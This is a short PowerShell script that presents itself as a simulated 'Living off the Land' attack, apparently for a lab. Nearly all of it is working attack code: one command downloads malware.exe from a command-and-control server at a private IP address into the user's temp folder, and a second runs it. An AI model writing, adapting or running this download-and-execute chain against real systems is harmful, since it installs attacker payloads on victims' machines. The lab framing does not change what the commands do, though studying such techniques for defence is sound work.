# ====================================================================================
# Script Name: LotL_Attack.ps1
# Author: Yashwanth H L
# Description: Simulates a "Living off the Land" (LotL) attack by utilizing built-in 
#              Windows binaries (PowerShell) to download and execute a staged payload 
#              from a command-and-control server into a hidden temporary directory.
# ====================================================================================

# Step 1: Download the staged payload from the C2 server (Kali Linux)
Invoke-WebRequest -Uri "http://10.240.24.204:8000/malware.exe" -OutFile "$env:TEMP\malware.exe"

# Step 2: Execute the downloaded payload directly from the Temp folder
Start-Process "$env:TEMP\malware.exe"
